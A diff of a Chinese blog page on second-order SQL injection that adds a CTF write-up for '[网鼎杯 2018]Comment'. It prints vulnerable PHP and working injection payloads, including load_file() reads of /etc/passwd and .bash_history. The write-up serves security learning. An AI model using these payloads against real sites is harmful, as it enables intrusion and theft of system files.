@@ -17,7 +17,7 @@
 <meta property="og:description" content="二次注入漏洞原理二次注入是攻击者构造恶意数据，并且将这个数据存储在数据库里，虽然在用户输入恶意数据时会对其中的特殊字符进行了转义处理，但是当恶意数据插入到数据库时被处理的数据又会被还原并存储到数据库中，当web程序调用在数据库中的恶意数据时，将不会再进行转义，此时会执行sql查询，这就造成了sql二次注入 二次注入的步骤 插入恶意数据  引用恶意数据   实例(CISCN2019 华北赛区 Day">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2021-09-22T16:00:00.000Z">
-<meta property="article:modified_time" content="2021-09-26T05:52:35.627Z">
+<meta property="article:modified_time" content="2021-09-27T14:44:29.972Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="sql注入">
 <meta name="twitter:card" content="summary">
@@ -275,8 +275,71 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||extractvalue(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;)))))#</span><br></pre></td></tr></table></figure>
 <p>最后拼接即可</p>
 <p>参考文章：[<a target="_blank" rel="noopener" href="https://blog.csdn.net/SopRomeo/article/details/107324563]">https://blog.csdn.net/SopRomeo/article/details/107324563]</a></p>
-<pre><code>[https://blog.csdn.net/qq_36761831/article/details/82862135]
+<pre><code> [https://blog.csdn.net/qq_36761831/article/details/82862135]
 </code></pre>
+<h2 id="实例3-网鼎杯-2018-Comment"><a href="#实例3-网鼎杯-2018-Comment" class="headerlink" title="实例3([网鼎杯 2018]Comment)"></a>实例3([网鼎杯 2018]Comment)</h2><p>打开页面，发现是一个留言板，然后发现要发帖的话，需要先登录，而它有提示是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zhangwei***</span><br></pre></td></tr></table></figure>
+<p>后面是三位数字，所以可以使用爆破的方法，爆出密码为zhangwei666，然后就没有发现什么有价值的信息，所以使用GitHack.py进行扫描，发现有.git文件泄露</p>
+<p>write_do.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;mysql.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line">if($_SESSION[&#x27;login&#x27;] != &#x27;yes&#x27;)&#123;</span><br><span class="line">    header(&quot;Location: ./login.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;do&#x27;]))&#123;</span><br><span class="line">switch ($_GET[&#x27;do&#x27;])</span><br><span class="line">&#123;</span><br><span class="line">case &#x27;write&#x27;:</span><br><span class="line">    break;</span><br><span class="line">case &#x27;comment&#x27;:</span><br><span class="line">    break;</span><br><span class="line">default:</span><br><span class="line">    header(&quot;Location: ./index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    header(&quot;Location: ./index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>但是发现代码补全，然后查看控制台，发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">程序员GIT写一半跑路了,都没来得及Commit :)</span><br></pre></td></tr></table></figure>
+<p>这一个重要的信息，所以我们需要找到commit的值来恢复php文件，所以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log --all</span><br></pre></td></tr></table></figure>
+<p>来查看历史记录并找到commit的值，即寻找有write_do.php字段的commit，然后使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard commit的值</span><br></pre></td></tr></table></figure>
+<p>来恢复文件</p>
+<p>write_do.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;mysql.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line">if($_SESSION[&#x27;login&#x27;] != &#x27;yes&#x27;)&#123;</span><br><span class="line">    header(&quot;Location: ./login.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;do&#x27;]))&#123;</span><br><span class="line">switch ($_GET[&#x27;do&#x27;])</span><br><span class="line">&#123;</span><br><span class="line">case &#x27;write&#x27;:</span><br><span class="line">    $category = addslashes($_POST[&#x27;category&#x27;]);</span><br><span class="line">    $title = addslashes($_POST[&#x27;title&#x27;]);</span><br><span class="line">    $content = addslashes($_POST[&#x27;content&#x27;]);</span><br><span class="line">    $sql = &quot;insert into board</span><br><span class="line">            set category = &#x27;$category&#x27;,</span><br><span class="line">                title = &#x27;$title&#x27;,</span><br><span class="line">                content = &#x27;$content&#x27;&quot;;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(&quot;Location: ./index.php&quot;);</span><br><span class="line">    break;</span><br><span class="line">case &#x27;comment&#x27;:</span><br><span class="line">    $bo_id = addslashes($_POST[&#x27;bo_id&#x27;]);</span><br><span class="line">    $sql = &quot;select category from board where id=&#x27;$bo_id&#x27;&quot;;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    if($num&gt;0)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[&#x27;category&#x27;];</span><br><span class="line">    $content = addslashes($_POST[&#x27;content&#x27;]);</span><br><span class="line">    $sql = &quot;insert into comment</span><br><span class="line">            set category = &#x27;$category&#x27;,  </span><br><span class="line">                content = &#x27;$content&#x27;,</span><br><span class="line">                bo_id = &#x27;$bo_id&#x27;&quot;;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(&quot;Location: ./comment.php?id=$bo_id&quot;);</span><br><span class="line">    break;</span><br><span class="line">default:</span><br><span class="line">    header(&quot;Location: ./index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    header(&quot;Location: ./index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在发帖处给$title、$category和$content三个参数输入的值中的特殊符号会被addslashes()函数转义，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$category = addslashes($_POST[&#x27;category&#x27;]);</span><br><span class="line">    $title = addslashes($_POST[&#x27;title&#x27;]);</span><br><span class="line">    $content = addslashes($_POST[&#x27;content&#x27;]);</span><br></pre></td></tr></table></figure>
+
+<p>但是仍然会将这些值加入到数据库中，且加入到数据库后，转义的反斜杠会消失</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;insert into board</span><br><span class="line">        set category = &#x27;$category&#x27;,</span><br><span class="line">            title = &#x27;$title&#x27;,</span><br><span class="line">            content = &#x27;$content&#x27;&quot;;</span><br><span class="line">$result = mysql_query($sql);</span><br></pre></td></tr></table></figure>
+
+<p>而在详情中的提交留言界面，只有$bo_id和$content参数的值中的特殊符号被addslashes()函数用反斜杠转义</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$bo_id = addslashes($_POST[&#x27;bo_id&#x27;]);</span><br><span class="line">$content = addslashes($_POST[&#x27;content&#x27;]);</span><br></pre></td></tr></table></figure>
+<p>而$category参数的值，是将board表中的$category参数的值拿出来，其中没有经过addslashes()函数转义</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$result = mysql_query($sql);</span><br><span class="line"></span><br><span class="line">$category = mysql_fetch_array($result)[&#x27;category&#x27;];</span><br></pre></td></tr></table></figure>
+<p>所以可以看出存在二次注入，因此我们可以在反贴处中的$category写入恶意代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;, content=user(),/*</span><br></pre></td></tr></table></figure>
+<p>然后在留言处的$content参数中输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/#</span><br></pre></td></tr></table></figure>
+<p>其中/**/是多行注释，#是单行注释</p>
+<p>我们可以看见</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@localhost</span><br></pre></td></tr></table></figure>
+<p>可知这是root权限，所以我们可以尝试使用load_file()函数来读取文件，和上面一样构造<br>发帖处</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;, content=load_file(&#x27;/etc/passwd&#x27;),/*</span><br></pre></td></tr></table></figure>
+<p>留言处</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/#</span><br></pre></td></tr></table></figure>
+
+<p>读取历史操作</p>
+<p>发帖处</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;, content=load_file(&#x27;/home/www/.bash_history&#x27;),/*</span><br></pre></td></tr></table></figure>
+
+<p>留言处</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/#</span><br></pre></td></tr></table></figure>
+
+<p>注意到/var/www/html目录下的.DS_Store文件被删除，但是在/tmp/html目录下仍然有.DS_Store文件<br>发帖处</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;, content=hex(load_file(&#x27;/tmp/html/.DS_Store&#x27;)),/*</span><br></pre></td></tr></table></figure>
+
+<p>留言处</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/#</span><br></pre></td></tr></table></figure>
+
+<p>然后将获取的十六进制数据放到winhex，可以看见flag_8946e1ff1ee3e40f.php<br>发帖处</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;, content=load_file(&#x27;/tmp/html/flag_8946e1ff1ee3e40f.php&#x27;),/*</span><br></pre></td></tr></table></figure>
+
+<p>留言处</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/#</span><br></pre></td></tr></table></figure>
+<p>发现是一个假的flag</p>
+<p>所以访问/var/www/html/目录下的flag_8946e1ff1ee3e40f.php<br>发帖处</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;, content=(load_file(&#x27;/var/www/html/flag_8946e1ff1ee3e40f.php&#x27;)),/*</span><br></pre></td></tr></table></figure>
+
+<p>留言处</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/#</span><br></pre></td></tr></table></figure>
+
+<p>就可以读到flag</p>
 
       
     </div>
